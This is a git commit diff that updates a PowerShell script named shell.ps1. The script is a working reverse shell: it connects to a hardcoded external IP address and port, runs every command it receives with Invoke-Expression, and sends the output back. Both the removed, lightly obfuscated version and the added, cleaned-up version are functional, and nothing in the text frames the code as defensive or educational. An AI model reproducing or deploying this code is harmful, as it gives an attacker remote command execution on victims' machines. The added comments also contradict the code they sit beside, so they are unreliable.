06293d95177da88efe12619657f80f8c692d0135
itssixtyn3in <130003354+itssixtyn3in@users.noreply.github.com>
2024-07-18 09:50:35 -0700

    Update shell.ps1

--- shell.ps1
+++ shell.ps1
@@ -1,15 +1,23 @@
 $KLK = New-Object System.Net.Sockets.TCPClient('172.232.190.135','9991');
 $PLP = $KLK.GetStream();
-[byte[]]$VVCCA = 0..((2-shl(3*5))-1)|%{0};
-$VVCCA = ([text.encoding]::UTF8).GetBytes("Succesfuly connected .`n`n")
-$PLP.Write($VVCCA,0,$VVCCA.Length)
-$VVCCA = ([text.encoding]::UTF8).GetBytes((Get-Location).Path + ' > ')
-$PLP.Write($VVCCA,0,$VVCCA.Length)
-[byte[]]$VVCCA = 0..((2-shl(3*5))-1)|%{0};
-while(($A = $PLP.Read($VVCCA, 0, $VVCCA.Length)) -ne 0){;$DD = (New-Object System.Text.UTF8Encoding).GetString($VVCCA,0, $A);
-$VZZS = (i`eX $DD 2>&1 | Out-String );
-$HHHHHH  = $VZZS + (pwd).Path + '! ';
-$L = ([text.encoding]::UTF8).GetBytes($HHHHHH);
-$PLP.Write($L,0,$L.Length);
-$PLP.Flush()};
-$KLK.Close()
+
+# You don't need to declare $VVCCA as [byte[]] again here
+$VVCCA = ([text.encoding]::UTF8).GetBytes("Successfully connected.`n`n");
+$PLP.Write($VVCCA,0,$VVCCA.Length);
+
+# Reassigning $VVCCA should be removed, since it's already declared
+$VVCCA = ([text.encoding]::UTF8).GetBytes((Get-Location).Path + ' > ');
+$PLP.Write($VVCCA,0,$VVCCA.Length);
+
+# No need to declare $VVCCA as [byte[]] again here
+$VVCCA = 0..((2 -shl (3*5)) - 1) | % { 0 };
+while (($A = $PLP.Read($VVCCA, 0, $VVCCA.Length)) -ne 0) {
+    $DD = (New-Object System.Text.UTF8Encoding).GetString($VVCCA, 0, $A);
+    $VZZS = (iex $DD 2>&1 | Out-String);
+    $HHHHHH = $VZZS + (Get-Location).Path + '! ';
+    $L = ([text.encoding]::UTF8).GetBytes($HHHHHH);
+    $PLP.Write($L, 0, $L.Length);
+    $PLP.Flush();
+}
+
+$KLK.Close();
